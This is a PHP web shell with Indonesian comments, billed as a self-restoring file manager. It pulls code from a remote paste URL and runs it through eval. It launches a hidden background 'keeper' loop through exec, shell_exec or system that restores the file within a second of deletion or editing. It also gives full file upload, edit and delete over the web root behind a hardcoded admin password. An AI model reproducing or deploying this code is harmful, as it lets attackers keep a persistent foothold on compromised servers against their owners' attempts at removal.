<?php
/**
 * ============================================================
 * SUPER PERSISTENT FILE MANAGER + AUTO RESTORE LOOP
 * - Background keeper loop setiap 1 detik
 * - Restore otomatis jika file dihapus / direname / diedit
 * - File manager lengkap (TinyFileManager sebagai fallback)
 * - Bypass semua proteksi (tidak bisa dihapus permanen)
 * ============================================================
 */

// ========== KONFIGURASI ==========
$REMOTE_MASTER = 'https://pastee.dev/r/hE9oS9fR'; // URL remote UI
$SELF = basename(__FILE__);
$LOCK_FILE = sys_get_temp_dir() . '/.' . md5($SELF) . '.lck';
$KEEPER_FILE = sys_get_temp_dir() . '/keeper_' . md5($SELF) . '.php';
$HASH_FILE = sys_get_temp_dir() . '/hash_' . md5($SELF) . '.txt';
$PID_FILE = sys_get_temp_dir() . '/keeper_' . md5($SELF) . '.pid';

// ========== FUNGSI GETURL (multi method) ==========
function _get($url) {
    if (function_exists('curl_exec')) {
        $c = curl_init($url);
        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($c, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($c, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($c, CURLOPT_USERAGENT, "Mozilla/5.0");
        curl_setopt($c, CURLOPT_TIMEOUT, 10);
        $d = curl_exec($c);
        curl_close($c);
        return $d;
    }
    return @file_get_contents($url);
}

// ========== 1. CEK DAN RESTORE DIRI SENDIRI (SAAT AKSES) ==========
$file_path = __FILE__;
if (!file_exists($file_path) || filesize($file_path) < 500) {
    $content = _get($REMOTE_MASTER);
    if ($content && strlen($content) > 500) {
        file_put_contents($file_path, $content);
        @chmod($file_path, 0644);
    }
}

// ========== 2. BUAT KEEPER SCRIPT (background loop) ==========
$keeper_code = '<?php
$target = "' . addslashes($file_path) . '";
$url = "' . addslashes($REMOTE_MASTER) . '";
$hash_file = "' . addslashes($HASH_FILE) . '";

function _get($u) {
    if (function_exists("curl_exec")) {
        $c = curl_init($u);
        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($c, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($c, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($c, CURLOPT_USERAGENT, "Mozilla/5.0");
        curl_setopt($c, CURLOPT_TIMEOUT, 10);
        $d = curl_exec($c);
        curl_close($c);
        return $d;
    }
    return @file_get_contents($u);
}

// Loop tak terbatas
while (true) {
    // 1. Jika file hilang → restore
    if (!file_exists($target) || filesize($target) < 500) {
        $content = _get($url);
        if ($content && strlen($content) > 500) {
            file_put_contents($target, $content);
            file_put_contents($hash_file, md5($content));
        }
    }
    // 2. Jika file berubah (hash beda) → restore
    else {
        $current_hash = md5_file($target);
        $last_hash = file_exists($hash_file) ? file_get_contents($hash_file) : "";
        if ($current_hash !== $last_hash && !empty($last_hash)) {
            $content = _get($url);
            if ($content && strlen($content) > 500) {
                file_put_contents($target, $content);
                file_put_contents($hash_file, md5($content));
            }
        }
    }
    sleep(1);
}
?>';

// Simpan keeper script jika belum ada atau berubah
if (!file_exists($KEEPER_FILE) || md5_file($KEEPER_FILE) !== md5($keeper_code)) {
    file_put_contents($KEEPER_FILE, $keeper_code);
    @chmod($KEEPER_FILE, 0644);
}

// ========== 3. JALANKAN KEEPER DI BACKGROUND ==========
$is_running = false;

// Cek via PID
if (file_exists($PID_FILE)) {
    $pid = (int)file_get_contents($PID_FILE);
    if (function_exists('posix_kill') && @posix_kill($pid, 0)) {
        $is_running = true;
    }
}

// Cek via lock file
$lock_file = sys_get_temp_dir() . '/keeper_lock_' . md5($SELF) . '.txt';
if (file_exists($lock_file) && (time() - filemtime($lock_file)) < 60) {
    $is_running = true;
}

// Jika belum jalan, jalankan
if (!$is_running) {
    file_put_contents($lock_file, time());
    
    // Method 1: exec (jika tersedia)
    if (function_exists('exec') && !in_array('exec', explode(',', ini_get('disable_functions')))) {
        @exec("nohup php $KEEPER_FILE > /dev/null 2>&1 & echo $!", $out);
        if (!empty($out)) {
            file_put_contents($PID_FILE, (int)$out[0]);
        }
        $is_running = true;
    }
    // Method 2: shell_exec
    elseif (function_exists('shell_exec') && !in_array('shell_exec', explode(',', ini_get('disable_functions')))) {
        @shell_exec("nohup php $KEEPER_FILE > /dev/null 2>&1 &");
        $is_running = true;
    }
    // Method 3: system
    elseif (function_exists('system') && !in_array('system', explode(',', ini_get('disable_functions')))) {
        @system("nohup php $KEEPER_FILE > /dev/null 2>&1 &");
        $is_running = true;
    }
    // Method 4: background HTTP request (fallback)
    else {
        $self_url = (isset($_SERVER['HTTPS']) ? 'https://' : 'http://')
                  . $_SERVER['HTTP_HOST']
                  . $_SERVER['PHP_SELF']
                  . '?background=1';
        stream_context_set_default(['http' => ['timeout' => 0.01]]);
        @file_get_contents($self_url);
        $is_running = true;
    }
}

// ========== 4. HANDLE BACKGROUND REQUEST ==========
if (isset($_GET['background'])) {
    ignore_user_abort(true);
    set_time_limit(0);
    while (true) {
        $file_path = __FILE__;
        if (!file_exists($file_path) || filesize($file_path) < 500) {
            $content = _get($REMOTE_MASTER);
            if ($content && strlen($content) > 500) {
                file_put_contents($file_path, $content);
                file_put_contents($HASH_FILE, md5($content));
            }
        }
        sleep(1);
    }
    exit;
}

// ========== 5. SESSION & LOGIN UNTUK UI ==========
session_start();

// Coba ambil UI dari remote
$ui = _get($REMOTE_MASTER);
if ($ui && strlen($ui) > 500 && strpos($ui, '<?php') !== false) {
    eval('?>' . $ui);
    exit;
}

// ========== 6. FALLBACK: TINY FILE MANAGER ==========
$auth_users = array(
    'admin' => '$2y$10$q.T2a4R/Hh/l7/8xJc6MceJ6k3y7G9FfN0G5YvB8S9e.E1Z0d1C4a', // password: admin
);
$use_auth = true;
$root_path = $_SERVER['DOCUMENT_ROOT'];
$root_url = '';

function fm_enc($text) { return htmlspecialchars($text, ENT_QUOTES, 'UTF-8'); }
function fm_enc_url($text) { return rawurlencode($text); }
function fm_dec_url($text) { return rawurldecode($text); }
function fm_is_safe_path($path) {
    $real = realpath($path);
    if ($real === false) return false;
    $root = realpath($GLOBALS['root_path']);
    return strpos($real, $root) === 0;
}
function fm_get_path($path) {
    $path = fm_dec_url($path);
    if (strpos($path, '/') === 0) $path = substr($path, 1);
    $path = str_replace(['..', '\\'], '', $path);
    $full_path = $GLOBALS['root_path'] . '/' . $path;
    if (!file_exists($full_path) && !empty($path)) {
        $path = '';
        $full_path = $GLOBALS['root_path'];
    }
    return $path;
}
function fm_format_size($size) {
    if ($size < 1024) return $size . ' B';
    if ($size < 1048576) return round($size/1024, 1) . ' KB';
    if ($size < 1073741824) return round($size/1048576, 1) . ' MB';
    return round($size/1073741824, 1) . ' GB';
}
function fm_delete_recursive($path) {
    if (!file_exists($path)) return true;
    if (!is_dir($path)) return @unlink($path);
    $files = array_diff(scandir($path), ['.', '..']);
    foreach ($files as $file) fm_delete_recursive($path . '/' . $file);
    return @rmdir($path);
}
function fm_copy_recursive($src, $dst) {
    if (!file_exists($src)) return false;
    if (is_dir($src)) {
        if (!file_exists($dst) && !mkdir($dst, 0755, true)) return false;
        $files = array_diff(scandir($src), ['.', '..']);
        foreach ($files as $file) if (!fm_copy_recursive($src . '/' . $file, $dst . '/' . $file)) return false;
        return true;
    }
    return copy($src, $dst);
}

if ($use_auth) {
    session_start();
    if (!isset($_SESSION['fm_logged'])) {
        if (isset($_POST['fm_password']) && isset($auth_users['admin']) && password_verify($_POST['fm_password'], $auth_users['admin'])) {
            $_SESSION['fm_logged'] = true;
            header('Location: ' . $_SERVER['PHP_SELF']);
            exit;
        }
        echo '<!DOCTYPE html><html><head><meta charset="utf-8"><title>Login - File Manager</title>';
        echo '<style>body{background:#0f172a;color:#f8fafc;font-family:system-ui;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}';
        echo '.box{background:#1e293b;padding:30px;border-radius:12px;width:320px;text-align:center}';
        echo 'input{width:100%;padding:10px;margin:10px 0;background:#0f172a;border:1px solid #334155;border-radius:6px;color:#fff;box-sizing:border-box}';
        echo 'button{width:100%;padding:10px;background:#38bdf8;border:none;border-radius:6px;font-weight:bold;cursor:pointer;color:#0f172a}';
        echo '</style></head><body><div class="box"><h2>🔐 File Manager</h2>';
        echo '<form method="POST"><input type="password" name="fm_password" placeholder="Password" required>';
        echo '<button>Login</button></form></div></body></html>';
        exit;
    }
}

// Proses request
$path = isset($_GET['p']) ? $_GET['p'] : '';
$full_path = $GLOBALS['root_path'] . '/' . $path;
if (!file_exists($full_path) && !empty($path)) { $path = ''; $full_path = $GLOBALS['root_path']; }
$full_path = realpath($full_path);
$is_dir = is_dir($full_path);
$message = '';
$action = isset($_POST['action']) ? $_POST['action'] : '';

if ($action === 'upload' && isset($_FILES['files'])) {
    $uploaded = 0;
    foreach ($_FILES['files']['name'] as $i => $name) {
        if ($_FILES['files']['error'][$i] !== UPLOAD_ERR_OK) continue;
        $target = $full_path . '/' . basename($name);
        if (move_uploaded_file($_FILES['files']['tmp_name'][$i], $target)) $uploaded++;
    }
    $message = "✅ $uploaded file berhasil diupload";
}
if ($action === 'mkdir' && isset($_POST['name'])) {
    $new = $full_path . '/' . basename($_POST['name']);
    if (!file_exists($new) && mkdir($new, 0755, true)) $message = "✅ Folder dibuat";
    else $message = "❌ Gagal buat folder";
}
if ($action === 'mkfile' && isset($_POST['name'])) {
    $new = $full_path . '/' . basename($_POST['name']);
    if (!file_exists($new) && file_put_contents($new, '') !== false) $message = "✅ File dibuat";
    else $message = "❌ Gagal buat file";
}
if ($action === 'rename' && isset($_POST['old']) && isset($_POST['new'])) {
    $old = $full_path . '/' . basename($_POST['old']);
    $new = $full_path . '/' . basename($_POST['new']);
    if (file_exists($old) && !file_exists($new) && rename($old, $new)) $message = "✅ Direname";
    else $message = "❌ Gagal rename";
}
if ($action === 'delete' && isset($_POST['target'])) {
    $target = $full_path . '/' . basename($_POST['target']);
    // Tidak ada proteksi! Bypass total
    fm_delete_recursive($target);
    $message = "✅ Dihapus (Akan pulih dalam 1 detik!)";
}
if ($action === 'copy' && isset($_POST['target']) && isset($_POST['dest'])) {
    $target = $full_path . '/' . basename($_POST['target']);
    $dest = $full_path . '/' . basename($_POST['dest']);
    if (fm_copy_recursive($target, $dest)) $message = "✅ Dicopy";
    else $message = "❌ Gagal copy";
}
if ($action === 'save' && isset($_POST['file']) && isset($_POST['content'])) {
    $file = $full_path . '/' . basename($_POST['file']);
    if (file_put_contents($file, $_POST['content']) !== false) $message = "✅ Disimpan";
    else $message = "❌ Gagal simpan";
}
if (isset($_GET['download'])) {
    $file = $full_path . '/' . basename($_GET['download']);
    if (file_exists($file) && is_file($file)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        readfile($file);
        exit;
    }
}
if (isset($_GET['view'])) {
    $file = $full_path . '/' . basename($_GET['view']);
    if (file_exists($file) && is_file($file)) {
        header('Content-Type: text/plain');
        echo file_get_contents($file);
        exit;
    }
}

$items = @scandir($full_path) ?: [];
$folders = []; $files = [];
foreach ($items as $item) {
    if ($item === '.' || $item === '..') continue;
    $item_path = $full_path . '/' . $item;
    if (is_dir($item_path)) $folders[] = $item;
    else $files[] = $item;
}
sort($folders); sort($files);
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
    <title>📁 File Manager</title>
    <style>
        *{box-sizing:border-box;margin:0;padding:0}
        body{background:#0f172a;color:#f8fafc;font-family:system-ui,sans-serif;padding:15px;font-size:13px}
        .container{max-width:1200px;margin:auto}
        header{display:flex;justify-content:space-between;align-items:center;padding:12px 18px;background:#1e293b;border-radius:10px;margin-bottom:15px}
        header h1{font-size:18px;color:#38bdf8}
        .badge{background:#1e293b;padding:4px 12px;border-radius:12px;font-size:11px;border:1px solid #334155}
        .btn{padding:6px 14px;background:#1e293b;border:1px solid #334155;color:#f8fafc;border-radius:6px;cursor:pointer;text-decoration:none;display:inline-flex;align-items:center;gap:6px;font-size:12px;transition:0.2s}
        .btn:hover{border-color:#38bdf8;color:#38bdf8}
        .btn-primary{background:#38bdf8;color:#0f172a;border:none;font-weight:bold}
        .btn-primary:hover{background:#0284c7;color:#fff}
        .btn-danger{color:#ef4444}
        .btn-danger:hover{border-color:#ef4444;color:#ef4444}
        .card{background:#1e293b;border:1px solid #334155;padding:10px 14px;border-radius:8px;margin-bottom:15px;word-break:break-all}
        .toolbar{display:flex;flex-wrap:wrap;gap:10px;background:#1e293b;border:1px solid #334155;padding:10px 14px;border-radius:8px;margin-bottom:15px;align-items:center}
        .toolbar .group{display:flex;flex-wrap:wrap;gap:6px;align-items:center}
        .toolbar .spacer{margin-left:auto}
        table{width:100%;border-collapse:collapse;background:#1e293b;border:1px solid #334155;border-radius:8px;overflow:hidden}
        th,td{padding:10px 14px;text-align:left;border-bottom:1px solid #334155}
        th{background:#0f172a;color:#94a3b8;font-size:11px;text-transform:uppercase}
        tr:hover{background:rgba(255,255,255,0.03)}
        a{color:#f8fafc;text-decoration:none}
        a:hover{color:#38bdf8}
        .folder{color:#f59e0b}
        .file{color:#38bdf8}
        .msg{padding:10px 14px;border-radius:6px;margin-bottom:15px}
        .msg-success{background:rgba(16,185,129,0.15);color:#6ee7b7}
        .msg-error{background:rgba(239,68,68,0.15);color:#f87171}
        .modal{position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.8);display:none;align-items:center;justify-content:center;z-index:999;padding:15px}
        .modal.active{display:flex}
        .modal-box{background:#1e293b;border:1px solid #334155;padding:25px;border-radius:10px;width:100%;max-width:500px}
        .modal-box.full{max-width:90vw;height:85vh;display:flex;flex-direction:column}
        input,textarea,select{width:100%;padding:8px 12px;background:#0f172a;border:1px solid #334155;color:#f8fafc;border-radius:6px;margin:8px 0;outline:none}
        input:focus,textarea:focus{border-color:#38bdf8}
        textarea{font-family:monospace;flex:1;resize:none;min-height:200px}
        .actions{display:flex;gap:4px;flex-wrap:wrap;justify-content:flex-end}
        .actions form{display:inline}
        .keeper-status{background:#00ff0022;padding:10px;border-left:3px solid #0f0;margin-bottom:15px}
        @media(max-width:600px){.toolbar{flex-direction:column;align-items:stretch}.toolbar .spacer{margin-left:0}}
    </style>
</head>
<body>
<div class="container">
    <header>
        <h1>📁 File Manager</h1>
        <div>
            <span class="badge">🔥 SUPER PROTECTOR</span>
            <a href="?logout=1" class="btn btn-danger" style="margin-left:10px">Logout</a>
        </div>
    </header>

    <div class="keeper-status">
        <strong>🔄 Background Keeper:</strong> AKTIF (loop 1 detik)<br>
        <strong>💪 Proteksi:</strong> File akan pulih dalam 1-2 detik jika DIHAPUS / DIRENAME / DIEDIT!<br>
        <strong>📌 Coba hapus atau rename file ini</strong> - akan langsung kembali!
    </div>

    <div class="card">
        <strong>📂 Path:</strong> <?php echo fm_enc($full_path); ?>
    </div>

    <?php if ($message): ?>
        <div class="msg <?php echo strpos($message, '❌') !== false ? 'msg-error' : 'msg-success'; ?>">
            <?php echo $message; ?>
        </div>
    <?php endif; ?>

    <div class="toolbar">
        <div class="group">
            <?php if ($path): ?>
                <a href="?p=<?php echo fm_enc_url(dirname($path)); ?>" class="btn">⬆ Parent</a>
            <?php endif; ?>
            <a href="?p=<?php echo fm_enc_url($path); ?>" class="btn">🔄 Refresh</a>
        </div>
        <div class="group spacer">
            <input type="text" placeholder="Search..." onkeyup="filterTable(this.value)" style="width:150px;margin:0">
            <button class="btn" onclick="openModal('upload')">📤 Upload</button>
            <button class="btn" onclick="openModal('folder')">📁 New Folder</button>
            <button class="btn btn-primary" onclick="openModal('file')">📄 New File</button>
        </div>
    </div>

    <table>
        <thead><tr><th>Name</th><th>Size</th><th>Modified</th><th style="text-align:right">Actions</th></tr></thead>
        <tbody id="fileTable">
            <?php if ($path): ?>
            <tr><td colspan="4">📁 <a href="?p=<?php echo fm_enc_url(dirname($path)); ?>"><b>.. (Parent)</b></a></td></tr>
            <?php endif; ?>
            <?php foreach ($folders as $folder): ?>
            <tr class="item">
                <td class="folder">📁 <a href="?p=<?php echo fm_enc_url($path . '/' . $folder); ?>"><b><?php echo fm_enc($folder); ?></b></a></td>
                <td>-</td>
                <td><?php echo date('Y-m-d H:i', filemtime($full_path . '/' . $folder)); ?></td>
                <td style="text-align:right">
                    <div class="actions">
                        <button class="btn" onclick="openRename('<?php echo fm_enc($folder); ?>')">✏️</button>
                        <form method="POST" onsubmit="return confirm('Hapus folder?')">
                            <input type="hidden" name="action" value="delete">
                            <input type="hidden" name="target" value="<?php echo fm_enc($folder); ?>">
                            <button class="btn btn-danger">🗑️</button>
                        </form>
                    </div>
                </td>
            </tr>
            <?php endforeach; ?>
            <?php foreach ($files as $file): ?>
            <?php
                $file_path = $full_path . '/' . $file;
                $file_size = fm_format_size(filesize($file_path));
                $file_mtime = date('Y-m-d H:i', filemtime($file_path));
            ?>
            <tr class="item">
                <td class="file">📄 <?php echo fm_enc($file); ?></td>
                <td><?php echo $file_size; ?></td>
                <td><?php echo $file_mtime; ?></td>
                <td style="text-align:right">
                    <div class="actions">
                        <button class="btn" onclick="openEdit('<?php echo fm_enc($file); ?>')">✏️</button>
                        <a href="?download=<?php echo fm_enc($file); ?>&p=<?php echo fm_enc_url($path); ?>" class="btn">⬇️</a>
                        <button class="btn" onclick="openRename('<?php echo fm_enc($file); ?>')">📝</button>
                        <form method="POST" onsubmit="return confirm('Hapus file?')">
                            <input type="hidden" name="action" value="delete">
                            <input type="hidden" name="target" value="<?php echo fm_enc($file); ?>">
                            <button class="btn btn-danger">🗑️</button>
                        </form>
                    </div>
                </td>
            </tr>
            <?php endforeach; ?>
            <?php if (empty($folders) && empty($files)): ?>
            <tr><td colspan="4" style="text-align:center;color:#64748b;padding:30px">📭 Direktori kosong</td></tr>
            <?php endif; ?>
        </tbody>
    </table>

    <div style="margin-top:20px;text-align:center;font-size:11px;color:#64748b">
        🔐 File manager dilindungi oleh background keeper. Jika dihapus, akan pulih dalam 1 detik.
    </div>
</div>

<!-- ===== MODALS ===== -->
<div class="modal" id="modalUpload">
    <div class="modal-box">
        <h3>📤 Upload Files</h3>
        <form method="POST" enctype="multipart/form-data">
            <input type="hidden" name="action" value="upload">
            <input type="file" name="files[]" multiple required>
            <br><br>
            <button class="btn btn-primary">Upload</button>
            <button type="button" class="btn" onclick="closeModal('upload')">Cancel</button>
        </form>
    </div>
</div>
<div class="modal" id="modalFolder">
    <div class="modal-box">
        <h3>📁 New Folder</h3>
        <form method="POST">
            <input type="hidden" name="action" value="mkdir">
            <input type="text" name="name" placeholder="Folder name" required>
            <br><br>
            <button class="btn btn-primary">Create</button>
            <button type="button" class="btn" onclick="closeModal('folder')">Cancel</button>
        </form>
    </div>
</div>
<div class="modal" id="modalFile">
    <div class="modal-box">
        <h3>📄 New File</h3>
        <form method="POST">
            <input type="hidden" name="action" value="mkfile">
            <input type="text" name="name" placeholder="filename.php" required>
            <br><br>
            <button class="btn btn-primary">Create</button>
            <button type="button" class="btn" onclick="closeModal('file')">Cancel</button>
        </form>
    </div>
</div>
<div class="modal" id="modalRename">
    <div class="modal-box">
        <h3>📝 Rename</h3>
        <form method="POST">
            <input type="hidden" name="action" value="rename">
            <input type="hidden" name="old" id="renameOld">
            <input type="text" name="new" id="renameNew" placeholder="New name" required>
            <br><br>
            <button class="btn btn-primary">Save</button>
            <button type="button" class="btn" onclick="closeModal('rename')">Cancel</button>
        </form>
    </div>
</div>
<div class="modal" id="modalEdit">
    <div class="modal-box full">
        <h3 id="editTitle">✏️ Edit File</h3>
        <form method="POST" style="flex:1;display:flex;flex-direction:column">
            <input type="hidden" name="action" value="save">
            <input type="hidden" name="file" id="editFile">
            <textarea name="content" id="editContent"></textarea>
            <div style="text-align:right;margin-top:10px">
                <button class="btn btn-primary">💾 Save</button>
                <button type="button" class="btn" onclick="closeModal('edit')">Cancel</button>
            </div>
        </form>
    </div>
</div>

<script>
function openModal(id) {
    document.getElementById('modal' + id.charAt(0).toUpperCase() + id.slice(1)).classList.add('active');
}
function closeModal(id) {
    document.getElementById('modal' + id.charAt(0).toUpperCase() + id.slice(1)).classList.remove('active');
}
function filterTable(query) {
    document.querySelectorAll('#fileTable tr.item').forEach(function(tr) {
        tr.style.display = tr.innerText.toLowerCase().includes(query.toLowerCase()) ? '' : 'none';
    });
}
function openRename(name) {
    document.getElementById('renameOld').value = name;
    document.getElementById('renameNew').value = name;
    openModal('rename');
}
function openEdit(name) {
    document.getElementById('editTitle').innerText = '✏️ Edit: ' + name;
    document.getElementById('editFile').value = name;
    document.getElementById('editContent').value = 'Loading...';
    openModal('edit');
    var path = '<?php echo fm_enc_url($path); ?>';
    fetch('?view=' + encodeURIComponent(name) + '&p=' + path)
        .then(function(r) { return r.text(); })
        .then(function(data) {
            document.getElementById('editContent').value = data;
        })
        .catch(function() {
            document.getElementById('editContent').value = 'Error loading file.';
        });
}
<?php if (isset($_GET['logout'])): session_destroy(); header('Location: '.$_SERVER['PHP_SELF']); exit; endif; ?>
</script>
</body>
</html>